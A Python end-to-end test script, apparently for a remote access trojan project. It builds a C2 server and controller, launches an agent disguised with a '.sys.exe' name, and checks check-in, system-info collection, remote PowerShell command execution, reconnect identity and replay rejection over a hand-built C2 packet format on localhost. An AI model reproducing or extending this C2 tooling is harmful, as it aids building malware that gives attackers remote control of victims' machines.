# e2e_m2.py — 业务功能验收：sysinfo/exec + 重连同 ID + 防重放 + 多 CLI
import subprocess, sys, time, os, socket, struct

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GO = r"C:/Users/202603/.g/go/bin/go.exe"
C2 = os.path.join(ROOT, "bin", "c2server.exe")
RATCTL = os.path.join(ROOT, "bin", "ratctl.exe")
AGENT = os.path.join(ROOT, "client", "x64", "Debug", "RatAgent.sys.exe")
AGENT_ID_FILE = os.path.join(ROOT, "client", "x64", "Debug", "agent.id")
SRV_LOG = os.path.join(ROOT, "bin", "srv_m2.log")

ok = True
def check(name, cond, detail=""):
    global ok
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
    if not cond: ok = False

def run_ratctl(*args, timeout=30):
    r = subprocess.run([RATCTL, "-s", "127.0.0.1:4444", *args],
                       capture_output=True, text=True, timeout=timeout, cwd=ROOT)
    return r

def list_first_id():
    r = run_ratctl("list")
    lines = [l for l in r.stdout.splitlines()[1:] if l.strip()]
    return lines[0].split()[0] if lines else ""

def recv_exact(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError("closed")
        b += c
    return b

def silent_agent_hello(agent_id_hex):
    s = socket.create_connection(("127.0.0.1", 4444), timeout=5)
    agent_id = bytes.fromhex(agent_id_hex)
    payload = struct.pack("<IB", 0x00010001, 0) + agent_id + bytes(range(1, 17)) \
            + struct.pack("<IH", 0, 7) + b"Windows"
    hdr = struct.pack("<HBBIIHBBI", 0x5A5A, 1, 0, 1, 0, 0x0101, 0, 0, len(payload))
    s.sendall(hdr + payload)
    h = recv_exact(s, 20)
    recv_exact(s, struct.unpack("<I", h[16:20])[0])
    return s

def main():
    # 构建
    os.makedirs(os.path.join(ROOT, "bin"), exist_ok=True)
    subprocess.run([GO, "build", "-o", C2, "./server/cmd/c2server"], check=True, capture_output=True, cwd=ROOT)
    subprocess.run([GO, "build", "-o", RATCTL, "./ctl/cmd/ratctl"], check=True, capture_output=True, cwd=ROOT)
    if os.path.exists(SRV_LOG):
        os.remove(SRV_LOG)
    srv_logf = open(SRV_LOG, "a", encoding="utf-8", errors="replace")

    # 删除 agent.id → 首次运行生成新 ID
    if os.path.exists(AGENT_ID_FILE):
        os.remove(AGENT_ID_FILE)
    srv = subprocess.Popen([C2], stdout=srv_logf, stderr=subprocess.STDOUT)
    agent = None
    try:
        time.sleep(0.5)
        agent = subprocess.Popen([AGENT, "127.0.0.1", "4444"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 cwd=os.path.dirname(AGENT_ID_FILE))
        time.sleep(2.5)
        id1 = list_first_id()
        check("Agent 上线并取到 ID", len(id1) == 32, id1)

        # 1) sysinfo
        r = run_ratctl("sysinfo", id1)
        check("sysinfo 返回系统信息", r.returncode == 0 and "OS:" in r.stdout and "HOST:" in r.stdout,
              repr(r.stdout[:120]))

        # 2) exec
        r = run_ratctl("exec", id1, "--", "echo m2-hello")
        check("exec 执行 powershell 输出", r.returncode == 0 and "m2-hello" in r.stdout,
              repr(r.stdout[:120]))

        # 3) 重连同 ID：杀掉重启（保留 agent.id）
        agent.terminate(); agent.wait(timeout=5)
        time.sleep(1)
        agent = subprocess.Popen([AGENT, "127.0.0.1", "4444"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 cwd=os.path.dirname(AGENT_ID_FILE))
        time.sleep(2.5)
        id2 = list_first_id()
        check("重连后 agent_id 不变", id2 == id1, f"{id1} -> {id2}")

        # 4) 防重放：哑 agent 发两个相同 seq 的包，第二个应被服务器丢弃（日志 replay）
        dupe = silent_agent_hello("c0c1c2c3c4c5c6c7c8c9cacbcccdcecf")
        time.sleep(0.5)
        # 发 seq=5 心跳（明文）两次
        hb = struct.pack("<HBBIIHBBI", 0x5A5A, 1, 0, 5, 0, 0x0103, 0, 0, 0)
        dupe.sendall(hb)
        time.sleep(0.3)
        dupe.sendall(hb)  # 重放
        time.sleep(0.5)
        srv_logf.flush()
        log = open(SRV_LOG, encoding="utf-8", errors="replace").read()
        check("防重放：重复 seq 被丢弃(replay 日志)", "replay" in log and "c0c1c2c3c4c5c6c7c8c9cacbcccdcecf" in log)
        dupe.close()

        # 5) 多 CLI：两个 ratctl 并行 list 都成功
        r1 = run_ratctl("list"); r2 = run_ratctl("list")
        check("多 CLI：两个 list 并行成功", r1.returncode == 0 and r2.returncode == 0)
    finally:
        if agent:
            agent.terminate()
            try: agent.wait(timeout=3)
            except subprocess.TimeoutExpired: agent.kill()
        srv.terminate()
        try: srv.wait(timeout=3)
        except subprocess.TimeoutExpired: srv.kill()
        srv_logf.close()

    print("== RESULT:", "ALL PASS" if ok else "FAILURES PRESENT")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
